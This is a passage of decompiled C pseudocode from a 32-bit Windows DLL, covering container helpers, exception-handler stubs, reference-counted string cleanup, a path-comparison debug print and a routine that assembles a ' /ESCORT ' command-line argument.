    iVar3 = *(int *)(*param_5 + 4);
    local_10 = iVar3;
    iVar4 = FUN_10019200(iVar1,*(undefined4 *)(iVar1 + 4),&piStack_14);
    if (param_2[1] != 0xffffffe) {
      param_2[1] = param_2[1] + 1;
      *(int *)(iVar1 + 4) = iVar4;
      **(int **)(iVar4 + 4) = iVar4;
      iVar1 = param_3[2];
      piStack_14 = param_2;
      local_10 = iVar3;
      iVar4 = FUN_10019200(iVar1,*(undefined4 *)(iVar1 + 4),&piStack_14);
      if (param_3[3] != 0xffffffe) {
        param_3[3] = param_3[3] + 1;
        *(int *)(iVar1 + 4) = iVar4;
        **(int **)(iVar4 + 4) = iVar4;
        *local_c = CONCAT44(param_3,param_2);
        *(int *)(local_c + 1) = iVar3 + 0x10;
        *(undefined1 *)((int)local_c + 0xc) = 1;
        return;
      }
      goto LAB_10018a34;
    }
  }
  FUN_10056a6a("list<T> too long");
LAB_10018a34:
  FUN_10056a6a("list<T> too long");
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



/* Function: FUN_10018a40 */

undefined4 * __fastcall FUN_10018a40(int param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  int iVar4;
  int extraout_ECX;
  int iVar5;
  int extraout_EDX;
  undefined4 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074ec3;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  puVar2 = (undefined4 *)FUN_100582fa(0x18,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  local_8 = 0;
  if (puVar2 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)0x0;
  }
  else {
    *puVar2 = 0;
    puVar2[1] = 0;
    local_14 = puVar2;
    uVar3 = FUN_10018da0(0,0);
    *puVar2 = uVar3;
    local_8 = CONCAT31(local_8._1_3_,1);
    puVar2[2] = 0;
    puVar2[3] = 0;
    uVar3 = FUN_10018da0(0,0);
    puVar2[2] = uVar3;
    puVar2[4] = 0;
    puVar2[5] = 0;
  }
  local_8 = 0xffffffff;
  iVar1 = *(int *)(param_1 + 8);
  local_14 = puVar2;
  iVar4 = FUN_100191b0(iVar1,*(undefined4 *)(iVar1 + 4),&local_14);
  iVar5 = *(int *)(param_1 + 0xc);
  if (iVar5 == 0x15555554) {
    FUN_10056a6a("list<T> too long");
    iVar5 = extraout_ECX;
    iVar4 = extraout_EDX;
  }
  *(int *)(param_1 + 0xc) = iVar5 + 1;
  *(int *)(iVar1 + 4) = iVar4;
  **(int **)(iVar4 + 4) = iVar4;
  puVar2[5] = *(undefined4 *)(*(int *)(param_1 + 8) + 4);
  ExceptionList = local_10;
  return puVar2;
}



/* Function: FUN_10018b40 */

void __fastcall FUN_10018b40(int *param_1)

{
  if (*param_1 != 0) {
    thunk_FUN_100579ee(*param_1);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* Function: FUN_10018b70 */

void __fastcall FUN_10018b70(int *param_1)

{
  if (*param_1 != 0) {
    FUN_100190a0(*param_1,param_1);
    thunk_FUN_100579ee(*param_1);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* Function: FUN_10018bb0 */

void __fastcall FUN_10018bb0(int *param_1)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1[2] - param_1[1] >> 2 == 0) {
    iVar3 = param_1[1] - *param_1 >> 2;
    if (iVar3 == 0x3fffffff) {
      FUN_10056a6a("vector<T> too long");
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
    uVar4 = iVar3 + 1;
    uVar2 = param_1[2] - *param_1 >> 2;
    if (0x3fffffff - (uVar2 >> 1) < uVar2) {
      uVar2 = 0;
      if (uVar4 != 0) {
        uVar2 = uVar4;
      }
      FUN_10018cb0(uVar2);
      return;
    }
    uVar2 = uVar2 + (uVar2 >> 1);
    if (uVar2 < uVar4) {
      uVar2 = uVar4;
    }
    FUN_10018cb0(uVar2);
  }
  return;
}



/* Function: FUN_10018c20 */

void __thiscall FUN_10018c20(int *param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  char cVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074ee0;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  cVar2 = FUN_10018d30(param_2);
  if (cVar2 != '\0') {
    local_8 = 0;
    iVar1 = *param_1;
    FUN_100190e0(param_3);
    param_1[1] = iVar1 + param_2 * 0xc;
  }
  ExceptionList = local_10;
  return;
}



/* Function: Catch_All@10018c98 */

void Catch_All_10018c98(void)

{
  code *pcVar1;
  
  FUN_10018b70();
  FUN_1005de1b(0,0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_10018cb0 */

void __thiscall FUN_10018cb0(int *param_1,uint param_2)

{
  int iVar1;
  int iVar2;
  code *pcVar3;
  int iVar4;
  
  iVar4 = 0;
  if (param_2 != 0) {
    if (param_2 < 0x40000000) {
      iVar4 = FUN_100582fa(param_2 * 4);
      if (iVar4 != 0) goto LAB_10018cdf;
    }
    FUN_10056a39();
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
LAB_10018cdf:
  FUN_10057b70(iVar4,*param_1,param_1[1] - *param_1 & 0xfffffffc);
  iVar1 = *param_1;
  iVar2 = param_1[1];
  if (iVar1 != 0) {
    thunk_FUN_100579ee(iVar1);
  }
  *param_1 = iVar4;
  param_1[2] = iVar4 + param_2 * 4;
  param_1[1] = iVar4 + (iVar2 - iVar1 >> 2) * 4;
  return;
}



/* Function: FUN_10018d30 */

undefined4 __thiscall FUN_10018d30(int *param_1,uint param_2)

{
  code *pcVar1;
  int iVar2;
  undefined4 uVar3;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  if (param_2 == 0) {
    return 0;
  }
  if (param_2 < 0x15555556) {
    iVar2 = FUN_100582fa(param_2 * 0xc);
    if (iVar2 != 0) {
      *param_1 = iVar2;
      param_1[1] = iVar2;
      iVar2 = iVar2 + param_2 * 0xc;
      param_1[2] = iVar2;
      return CONCAT31((int3)((uint)iVar2 >> 8),1);
    }
  }
  else {
    FUN_10056a6a("vector<T> too long");
  }
  FUN_10056a39();
  pcVar1 = (code *)swi(3);
  uVar3 = (*pcVar1)();
  return uVar3;
}



/* Function: FUN_10018da0 */

void FUN_10018da0(int *param_1,int *param_2)

{
  code *pcVar1;
  int *piVar2;
  
  piVar2 = (int *)FUN_100582fa(0x10);
  if (piVar2 == (int *)0x0) {
    FUN_10056a39();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = piVar2;
    param_2 = piVar2;
  }
  *piVar2 = (int)param_1;
  if (piVar2 + 1 != (int *)0x0) {
    piVar2[1] = (int)param_2;
  }
  return;
}



/* Function: FUN_10018de0 */

int __fastcall FUN_10018de0(undefined4 param_1,uint *param_2,int *param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  bool bVar9;
  int local_c;
  undefined1 local_6;
  undefined1 local_5;
  
  piVar1 = (int *)param_2[1];
  piVar7 = *(int **)piVar1[-1];
  piVar8 = (int *)*piVar7;
  if (piVar8 != piVar7) {
    piVar2 = (int *)*param_2;
    do {
      iVar3 = piVar8[2];
      local_5 = *(uint *)(*piVar2 + 0x10) < *(uint *)(iVar3 + 0x10);
      local_6 = piVar2 == piVar1;
      piVar5 = piVar2;
      if (!(bool)local_6) {
        do {
          if (*piVar5 == iVar3) break;
          piVar5 = piVar5 + 1;
        } while (piVar5 != piVar1);
        local_6 = piVar5 == piVar1;
      }
      iVar4 = ((int *)piVar1[-1])[4];
      piVar5 = *(int **)(*param_3 + 4 + iVar4 * 0xc);
      piVar6 = *(int **)(*param_3 + iVar4 * 0xc);
      bVar9 = piVar6 == piVar5;
      if (!bVar9) {
        do {
          if (*piVar6 == iVar3) break;
          piVar6 = piVar6 + 1;
        } while (piVar6 != piVar5);
        bVar9 = piVar6 == piVar5;
      }
      if ((((bool)local_5) && ((bool)local_6 != false)) && (bVar9)) {
        piVar7 = (int *)CONCAT31((int3)((uint)piVar6 >> 8),!bVar9);
        local_c = iVar3;
        if ((&local_c < piVar1) && (piVar7 = &local_c, piVar2 <= &local_c)) {
          if (piVar1 == (int *)param_2[2]) {
            FUN_10018bb0(param_2);
          }
          if ((undefined4 *)param_2[1] != (undefined4 *)0x0) {
            *(undefined4 *)param_2[1] =
                 *(undefined4 *)(*param_2 + ((int)&local_c - (int)piVar2 >> 2) * 4);
          }
          param_2[1] = param_2[1] + 4;
          return iVar3;
        }
        if (piVar1 == (int *)param_2[2]) {
          FUN_10018bb0(piVar7);
        }
        if ((int *)param_2[1] != (int *)0x0) {
          *(int *)param_2[1] = iVar3;
        }
        param_2[1] = param_2[1] + 4;
        return iVar3;
      }
      piVar8 = (int *)*piVar8;
    } while (piVar8 != piVar7);
  }
  return 0;
}



/* Function: FUN_10018f20 */

int __thiscall FUN_10018f20(undefined4 *param_1,uint *param_2)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  uint *puVar4;
  undefined4 uVar5;
  int iVar6;
  uint uVar7;
  int *piVar8;
  
  puVar4 = param_2;
  param_2 = (uint *)0x0;
  piVar2 = (int *)puVar4[1];
  piVar8 = (int *)*puVar4;
  uVar7 = (uint)((int)piVar2 + (3 - (int)piVar8)) >> 2;
  if (piVar2 < piVar8) {
    uVar7 = 0;
  }
  if (uVar7 != 0) {
    do {
      puVar3 = (undefined4 *)*param_1;
      uVar5 = FUN_10007280(*(undefined4 *)(*piVar8 + 0x10),param_1);
      *puVar3 = uVar5;
      uVar5 = FUN_10007b60(&DAT_10083f90,0xffffffff);
      piVar8 = piVar8 + 1;
      *puVar3 = uVar5;
      param_2 = (uint *)((int)param_2 + 1);
    } while (param_2 != (uint *)uVar7);
  }
  piVar8 = (int *)*param_1;
  iVar6 = *piVar8;
  if ((iVar6 != 0) && (*(int *)(iVar6 + 8) != 0)) {
    if (iVar6 == 0) {
      iVar6 = 0;
    }
    else {
      iVar6 = iVar6 + 0xc;
    }
    iVar6 = FUN_10006250(&DAT_10083ff0,iVar6);
    piVar2 = (int *)*piVar8;
    if (piVar2 != (int *)0x0) {
      if (*piVar2 == 0) {
        piVar2[2] = 0;
        *(undefined1 *)(piVar2 + 3) = 0;
        *piVar8 = (int)piVar2;
        return iVar6;
      }
      LOCK();
      iVar1 = *piVar2;
      iVar6 = *piVar2;
      *piVar2 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        iVar6 = FUN_100579ee(piVar2);
      }
    }
    *piVar8 = 0;
  }
  return iVar6;
}



/* Function: FUN_10018ff0 */

void __thiscall FUN_10018ff0(int *param_1,uint *param_2)

{
  undefined4 uVar1;
  int *piVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  uint uVar6;
  int *piVar7;
  
  uVar6 = 0;
  piVar7 = (int *)*param_2;
  uVar5 = (uint)((int)param_2[1] + (3 - (int)piVar7)) >> 2;
  if ((int *)param_2[1] < piVar7) {
    uVar5 = 0;
  }
  if (uVar5 != 0) {
    do {
      uVar1 = *(undefined4 *)(*piVar7 + 0x10);
      piVar2 = *(int **)(*param_1 + 8);
      puVar4 = (undefined4 *)FUN_100582fa(0xc);
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)0x0;
      }
      else {
        *puVar4 = uVar1;
        puVar4[1] = 0xffffffff;
        puVar4[2] = 0xffffffff;
      }
      iVar3 = *(int *)*piVar2;
      if (iVar3 == -1) {
        *(int *)*piVar2 = (int)puVar4;
        *(undefined4 **)(*piVar2 + 4) = puVar4;
      }
      else {
        *(undefined4 **)(iVar3 + 4) = puVar4;
        puVar4[2] = *(undefined4 *)*piVar2;
        *(undefined4 **)*piVar2 = puVar4;
      }
      piVar2[1] = piVar2[1] + 1;
      uVar6 = uVar6 + 1;
      piVar7 = piVar7 + 1;
    } while (uVar6 != uVar5);
  }
  FUN_10015b50();
  return;
}



/* Function: FUN_100190a0 */

void __fastcall FUN_100190a0(int *param_1,int *param_2)

{
  if (param_1 != param_2) {
    do {
      if (*param_1 != 0) {
        thunk_FUN_100579ee(*param_1);
        *param_1 = 0;
        param_1[1] = 0;
        param_1[2] = 0;
      }
      param_1 = param_1 + 3;
    } while (param_1 != param_2);
  }
  return;
}



/* Function: FUN_100190e0 */

void __fastcall FUN_100190e0(int param_1,int param_2,undefined4 param_3)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined1 local_8;
  undefined3 uStack_7;
  
  puStack_c = &LAB_10074f11;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  uStack_7 = 0;
  for (; param_2 != 0; param_2 = param_2 + -1) {
    local_8 = 1;
    if (param_1 != 0) {
      FUN_10019230(param_3);
    }
    param_1 = param_1 + 0xc;
  }
  ExceptionList = local_10;
  return;
}



/* Function: Catch_All@10019144 */

void Catch_All_10019144(void)

{
  int iVar1;
  int unaff_EBP;
  int iVar2;
  
  iVar1 = *(int *)(unaff_EBP + -0x14);
  for (iVar2 = *(int *)(unaff_EBP + -0x18); iVar2 != iVar1; iVar2 = iVar2 + 0xc) {
    FUN_10019180(iVar2);
  }
  FUN_1005de1b(0,0);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_10019180 */

void FUN_10019180(int *param_1)

{
  if (*param_1 != 0) {
    thunk_FUN_100579ee(*param_1);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* Function: FUN_100191b0 */

void FUN_100191b0(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int iVar1;
  
  iVar1 = FUN_1000fa00(param_1,param_2);
  if ((undefined4 *)(iVar1 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar1 + 8) = *param_3;
  }
  return;
}



/* Function: FUN_100191d0 */

void FUN_100191d0(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int iVar4;
  
  iVar4 = FUN_100178c0(param_1,param_2);
  if ((undefined4 *)(iVar4 + 8) != (undefined4 *)0x0) {
    uVar1 = param_3[1];
    uVar2 = param_3[2];
    uVar3 = param_3[3];
    *(undefined4 *)(iVar4 + 8) = *param_3;
    *(undefined4 *)(iVar4 + 0xc) = uVar1;
    *(undefined4 *)(iVar4 + 0x10) = uVar2;
    *(undefined4 *)(iVar4 + 0x14) = uVar3;
  }
  return;
}



/* Function: FUN_10019200 */

void FUN_10019200(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int iVar1;
  
  iVar1 = FUN_10018da0(param_1,param_2);
  if ((undefined4 *)(iVar1 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar1 + 8) = *param_3;
    *(undefined4 *)(iVar1 + 0xc) = param_3[1];
  }
  return;
}



/* Function: FUN_10019230 */

undefined4 * __thiscall FUN_10019230(undefined4 *param_1,int *param_2)

{
  int iVar1;
  char cVar2;
  int iVar3;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  cVar2 = FUN_10019290(param_2[1] - *param_2 >> 2);
  if (cVar2 != '\0') {
    iVar1 = (param_2[1] - *param_2 >> 2) * 4;
    iVar3 = FUN_10057b70(*param_1,*param_2,iVar1);
    param_1[1] = iVar3 + iVar1;
  }
  return param_1;
}



/* Function: FUN_10019290 */

undefined4 __thiscall FUN_10019290(int *param_1,uint param_2)

{
  code *pcVar1;
  int iVar2;
  undefined4 uVar3;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  if (param_2 == 0) {
    return 0;
  }
  if (param_2 < 0x40000000) {
    iVar2 = FUN_100582fa(param_2 * 4);
    if (iVar2 != 0) {
      *param_1 = iVar2;
      param_1[1] = iVar2;
      iVar2 = iVar2 + param_2 * 4;
      param_1[2] = iVar2;
      return CONCAT31((int3)((uint)iVar2 >> 8),1);
    }
  }
  else {
    FUN_10056a6a("vector<T> too long");
  }
  FUN_10056a39();
  pcVar1 = (code *)swi(3);
  uVar3 = (*pcVar1)();
  return uVar3;
}



/* Function: FUN_10019300 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined * FUN_10019300(void)

{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  bool bVar4;
  char cVar5;
  char cVar6;
  undefined *puVar7;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 uStack_8;
  
  uStack_8 = 0xffffffff;
  puStack_c = &LAB_10074f35;
  local_10 = ExceptionList;
  cVar6 = '\0';
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  cVar5 = (int)uVar2 < 0;
  bVar4 = uVar2 == 0;
  ExceptionList = &local_10;
  _DAT_1009b480 = 0;
  uRam1009b484 = 0;
  uRam1009b488 = 0;
  uRam1009b48c = 0;
  _DAT_1009b490 = 0;
  puVar7 = &DAT_1009b480;
  DAT_1009b498 = 0;
  pcVar3 = (char *)FUN_103d3f02(&DAT_1009b480,uVar2);
  cVar1 = (char)pcVar3;
  if (!bVar4 && cVar6 == cVar5) {
    *pcVar3 = *pcVar3 + cVar1;
    *pcVar3 = *pcVar3 + cVar1;
    DAT_1009b49c = 0;
    _DAT_1009b4a0 = 0;
    DAT_1009b49c = FUN_1000fa00(0,puVar7);
    ExceptionList = (void *)CONCAT13(puStack_c._0_1_,local_10._1_3_);
    return &DAT_1009b480;
  }
  *pcVar3 = *pcVar3 + cVar1;
  thunk_FUN_100579ee(DAT_1009b49c);
  if (DAT_1009b498 != 0) {
    DAT_1009b498 = 0;
    (*DAT_100792fc)(&DAT_1009b480);
  }
  puVar7 = (undefined *)FUN_105f3dc0(&stack0xfffffffc,&DAT_1009b480);
  return puVar7;
}



/* Function: FUN_10019400 */

undefined4 __thiscall
FUN_10019400(void *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  undefined8 uVar5;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  puStack_10 = &LAB_10074f72;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  FUN_1041ec30(ExceptionList,param_1,DAT_100956e0 ^ (uint)&stack0xffffffd0);
  *(undefined4 *)((int)param_1 + 0x18) = 1;
  local_14 = (void *)0x0;
  iVar2 = FUN_10058463(0x60,&DAT_10098020);
  local_14._0_1_ = 1;
  if (iVar2 == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_1003fc90(param_2,param_3,param_4,param_5,param_6,0,0,0,0);
  }
  local_14 = (void *)CONCAT31(local_14._1_3_,2);
  iVar1 = *(int *)((int)param_1 + 0x1c);
  uVar3 = FUN_10019f30(iVar1,*(undefined4 *)(iVar1 + 4),&stack0xffffffd4);
  uVar5 = CONCAT44(uVar3,*(int *)((int)param_1 + 0x20));
  if (*(int *)((int)param_1 + 0x20) == 0x15555554) {
    uVar5 = FUN_10056a6a("list<T> too long");
  }
  iVar4 = (int)((ulonglong)uVar5 >> 0x20);
  *(int *)((int)param_1 + 0x20) = (int)uVar5 + 1;
  *(int *)(iVar1 + 4) = iVar4;
  local_14 = (void *)((uint)local_14 & 0xffffff00);
  **(int **)(iVar4 + 4) = iVar4;
  if (iVar2 != 0) {
    FUN_10019ea0(iVar2);
  }
  if (*(int *)(*(int *)(*(int *)((int)param_1 + 0x1c) + 4) + 8) != 0) {
    iVar2 = FUN_10040070();
    if (iVar2 != 0) {
      uVar3 = 0;
      goto LAB_10019510;
    }
  }
  uVar3 = 0x80040206;
LAB_10019510:
  *(undefined4 *)((int)param_1 + 0x18) = 0;
  (*DAT_100792fc)(param_1);
  ExceptionList = param_1;
  return uVar3;
}



/* Function: FUN_10019540 */

void __fastcall FUN_10019540(undefined4 param_1)

{
  void *local_14;
  undefined1 *puStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  puStack_10 = &LAB_10074fae;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  FUN_104981ca(param_1,DAT_100956e0 ^ (uint)&stack0xffffffd0);
  return;
}



/* Function: FUN_10019670 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

bool __fastcall FUN_10019670(undefined4 param_1)

{
  int iVar1;
  char cVar2;
  char *pcVar3;
  int iVar4;
  int *piVar5;
  int *piVar6;
  undefined **ppuVar7;
  short *psVar8;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar9;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int unaff_EBX;
  int *piVar10;
  int iVar11;
  undefined4 uVar12;
  void *pvStack_1c;
  void *local_14;
  undefined1 *local_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  local_10 = &LAB_10074ffe;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  pcVar3 = (char *)FUN_101fd5d8(param_1,DAT_100956e0 ^ (uint)&stack0xffffff90);
  *pcVar3 = *pcVar3 + (char)pcVar3;
  local_10 = (undefined1 *)0x0;
  piVar10 = (int *)*_DAT_00011863;
  iVar11 = 0x11847;
  if (piVar10 != _DAT_00011863) {
    do {
      iVar11 = unaff_EBX;
      if ((piVar10[2] == 0) || (iVar4 = (*DAT_100792f8)(piVar10[2],0x60), iVar4 != 0)) break;
      FUN_1003ffa0();
      FUN_10040070();
      if (*(int *)(piVar10[2] + 0x48) == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *(int *)(piVar10[2] + 0x48) + 0xc;
      }
      if (iVar4 != 0) {
        if (((*(int *)(piVar10[2] + 0x48) == 0) ||
            (psVar8 = (short *)(*(int *)(piVar10[2] + 0x48) + 0xc), psVar8 == (short *)0x0)) ||
           (*psVar8 != 0)) {
          piVar5 = (int *)FUN_1000bd10();
          uVar9 = extraout_ECX_00;
        }
        else {
          piVar5 = (int *)FUN_1000ba60();
          uVar9 = extraout_ECX;
        }
        local_10 = (undefined1 *)CONCAT31(local_10._1_3_,4);
        cVar2 = FUN_10019cc0(&DAT_10084020,uVar9);
        if (cVar2 == '\0') {
          FUN_1000bdd0(&DAT_10084020,extraout_ECX_01);
          if (*(int *)(piVar10[2] + 0x48) == 0) {
            iVar4 = 0;
          }
          else {
            iVar4 = *(int *)(piVar10[2] + 0x48) + 0xc;
          }
          FUN_1000bfa0(iVar4,0xffffffff);
          FUN_1000bfa0(&DAT_10084020,0xffffffff);
        }
        else {
          if (*(int *)(piVar10[2] + 0x48) == 0) {
            iVar4 = 0;
          }
          else {
            iVar4 = *(int *)(piVar10[2] + 0x48) + 0xc;
          }
          FUN_1000bdd0(iVar4,extraout_ECX_01);
        }
        FUN_1000bfa0(L" /ESCORT ",0xffffffff);
        uVar12 = 10;
        uVar9 = *(undefined4 *)piVar10[2];
        piVar6 = (int *)FUN_100155d0(uVar9,10);
        if ((piVar6 == (int *)0x0) || (ppuVar7 = (undefined **)(piVar6 + 3), piVar6[2] == 0)) {
          ppuVar7 = &PTR_10083554;
        }
        FUN_10021ec0(ppuVar7,0,extraout_ECX_02,0,uVar9,uVar12);
        FUN_10022630();
        if (piVar5 != (int *)0x0) {
          LOCK();
          iVar4 = *piVar5;
          *piVar5 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(piVar5);
          }
        }
        local_10 = (undefined1 *)((uint)local_10 & 0xffffff00);
        if (piVar6 != (int *)0x0) {
          LOCK();
          iVar4 = *piVar6;
          *piVar6 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(piVar6);
          }
        }
      }
      piVar5 = (int *)*piVar10;
      *(int **)piVar10[1] = piVar5;
      *(int *)(*piVar10 + 4) = piVar10[1];
      *(int *)(unaff_EBX + 0x20) = *(int *)(unaff_EBX + 0x20) + -1;
      iVar4 = piVar10[2];
      if (iVar4 != 0) {
        local_10 = (undefined1 *)CONCAT31(local_10._1_3_,2);
        FUN_1003ffa0();
        FUN_10040070();
        piVar6 = *(int **)(iVar4 + 0x48);
        if (piVar6 != (int *)0x0) {
          LOCK();
          iVar1 = *piVar6;
          *piVar6 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(piVar6);
          }
        }
        local_10 = (undefined1 *)((uint)local_10 & 0xffffff00);
        piVar6 = *(int **)(iVar4 + 0x44);
        if (piVar6 != (int *)0x0) {
          LOCK();
          iVar1 = *piVar6;
          *piVar6 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(piVar6);
          }
        }
        thunk_FUN_100579ee(iVar4);
      }
      piVar10[2] = 0;
      thunk_FUN_100579ee(piVar10);
      piVar10 = piVar5;
    } while (piVar5 != (int *)*(int *)(unaff_EBX + 0x1c));
  }
  iVar4 = *(int *)(iVar11 + 0x20);
  *(undefined4 *)(iVar11 + 0x18) = 0;
  (*DAT_100792fc)(iVar11);
  ExceptionList = pvStack_1c;
  return iVar4 != 0;
}



/* Function: FUN_10019900 */

undefined4 __thiscall FUN_10019900(short *param_1,short *param_2)

{
  uint uVar1;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  int *piVar5;
  int *piVar6;
  int iVar7;
  int *local_2c;
  int *local_28;
  int *local_24;
  int *local_20;
  int *local_1c;
  int *local_18;
  char local_11;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075050;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if (param_1 == (short *)0x0) {
    return 0x57;
  }
  ExceptionList = &local_10;
  *param_2 = 0;
  FUN_10021a40(0,0);
  local_8 = 0;
  local_18 = local_20;
  if (local_20 != (int *)0x0) {
    LOCK();
    *local_20 = *local_20 + 1;
    UNLOCK();
  }
  if (*param_1 == 0) {
    piVar2 = (int *)FUN_1000ba60();
  }
  else {
    piVar2 = (int *)FUN_1000bd10(uVar1);
  }
  if (piVar2 == (int *)0x0) {
    iVar4 = 0;
    piVar5 = (int *)0x0;
  }
  else {
    iVar4 = piVar2[2];
    piVar5 = piVar2 + 3;
  }
  local_11 = FUN_1004ab70(iVar4,piVar5);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar2;
    *piVar2 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  FUN_1000c820(local_11 != '\0');
  piVar2 = (int *)FUN_10019e10(&local_1c);
  local_8 = CONCAT31(local_8._1_3_,2);
  if ((*piVar2 == 0) || (ppuVar3 = (undefined **)(*piVar2 + 0xc), ppuVar3 == (undefined **)0x0)) {
    ppuVar3 = &PTR_10083554;
  }
  iVar4 = (**(code **)(PTR_DAT_10096f20 + 0x198))(ppuVar3,param_1);
  local_11 = iVar4 == 0;
  if (local_1c != (int *)0x0) {
    LOCK();
    iVar4 = *local_1c;
    *local_1c = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_1c);
    }
  }
  if (local_11 != '\0') {
    *param_2 = 1;
  }
  if (*param_1 == 0) {
    piVar2 = (int *)FUN_1000ba60();
  }
  else {
    piVar2 = (int *)FUN_1000bd10();
  }
  local_8._0_1_ = 3;
  local_1c = piVar2;
  piVar5 = (int *)FUN_1000ae10(&local_2c);
  FUN_10019e10(&local_28);
  local_8 = CONCAT31(local_8._1_3_,5);
  piVar6 = (int *)FUN_1000ae10(&local_24);
  if (*piVar5 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = *piVar5 + 0xc;
  }
  if (*piVar6 == 0) {
    iVar7 = 0;
  }
  else {
    iVar7 = *piVar6 + 0xc;
  }
  FUN_10006250("IsSamePath(\'%s\', \'%s\') == %d\n",iVar7,iVar4,(int)*param_2);
  if (local_24 != (int *)0x0) {
    LOCK();
    iVar4 = *local_24;
    *local_24 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_24);
    }
  }
  if (local_28 != (int *)0x0) {
    LOCK();
    iVar4 = *local_28;
    *local_28 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_28);
    }
  }
  if (local_2c != (int *)0x0) {
    LOCK();
    iVar4 = *local_2c;
    *local_2c = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_2c);
    }
  }
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar2;
    *piVar2 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  if (local_18 != (int *)0x0) {
    LOCK();
    iVar4 = *local_18;
    *local_18 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_18);
    }
  }
  if (local_20 != (int *)0x0) {
    LOCK();
    iVar4 = *local_20;
    *local_20 = *local_20 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_20);
    }
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_10019b50 */

undefined4 __thiscall
FUN_10019b50(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5
            ,undefined4 param_6,undefined4 param_7,undefined4 param_8,undefined4 param_9,
            undefined4 param_10)

{
  undefined4 uVar1;
  int iVar2;
